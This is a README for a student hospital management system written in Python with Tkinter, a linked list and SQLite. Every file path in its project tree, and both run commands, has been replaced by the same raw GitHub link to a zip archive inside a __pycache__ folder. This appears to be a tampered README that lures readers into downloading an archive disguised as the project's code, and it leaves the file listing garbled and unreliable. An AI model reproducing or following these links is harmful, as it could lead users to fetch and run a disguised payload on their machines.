# Hospital Management System (LinkedList Implementation)

A GUI-based hospital management system built in Python using Tkinter and custom data structures. This system manages patient records in a **Linked List**, prioritizes treatment based on **emergency levels**, and stores visit/treatment history in a **SQLite** database.

---

## 💡 Features

* 🏥 Add, update, delete patient records
* 🚑 Emergency level support (1: Critical – 3: Low)
* 🧾 Record and view visit history
* 💊 Treat patient and log treatment notes
* 📜 View treatment history (with illness and timestamp)
* 🧠 Undo last activity *(if implemented)*
* ✅ Validates required fields & unique patient IDs

---

## 🧱 Data Structures Used

* **LinkedList** → Patient storage (in-memory)
* **SQLite** → Visit/treatment history persistence
  *(Other structures like Heap, Stack, Queue, BST are prepared for future use)*

---

## 📂 Project Structure

```
dsa-sem-project-datacore/
│
├── src/
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                          # GUI application entry point
│   ├── db/
│   │   └── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                       # SQLite database functions
│   └── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
│       ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                 # LinkedList implementation               
│       ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip             # Patient model
│       ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
│       ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
│       ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
│       └── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
│
├── tests/
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip             # LinkedList logic tests
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                # Patient object validation
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                   # Heap operations
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                  # Queue operations
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                  # Stack operations
│   ├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                    # BST operations
│                      
│
├── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip                 # SQLite DB file (auto-created)
└── https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip

```

---

## 🚀 Getting Started

### Prerequisites

* Python 3.11+
* Standard modules: `tkinter`, `sqlite3`

### Run the App

```bash
python https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
```

### Run Unit Tests

```bash
python -m unittest https://raw.githubusercontent.com/Frank4112/dsa-sem-project-datacore/main/src/db/__pycache__/datacore_project_dsa_sem_v2.9.zip
```

---

## 🔠 UI Overview

* **Form inputs** for ID, Name, Age, Illness, Emergency Level
* **Buttons**: Add, Update, Delete, Treat, Add Visit, Current Visits, Treatment History
* **Listbox output**: Dynamically shows patient list, visit logs, or treatment logs

---

## 🧠 Logic Overview

* All patient data is held in a **Linked List**
* Patient visits and treatment notes are stored in **SQLite**
* `ID` must be unique when adding a patient
* Emergency level must be **1**, **2**, or **3**
* Visit/Treatment entries are timestamped

---

## 📈 Planned Improvements

* Add Undo/Redo support using Stack
* Export visit history to CSV
* Search/filter UI
* Switchable backend (Heap, BST, etc.)
* Role-based login (Admin/Doctor)

---

## 💪 Example Tests

Unit tests cover:

* Append, find, delete in linked list
* Duplicates and invalid data
* Visit logging and retrieval

---

## 👨‍💼 Author

* Brian Kirwa

* Mark Otinga

* Francis Omwenga

* Noela Jepchumba

* Eliud Odhiambo

* ICS Group D – Data Structures and Algorithms Semester Project
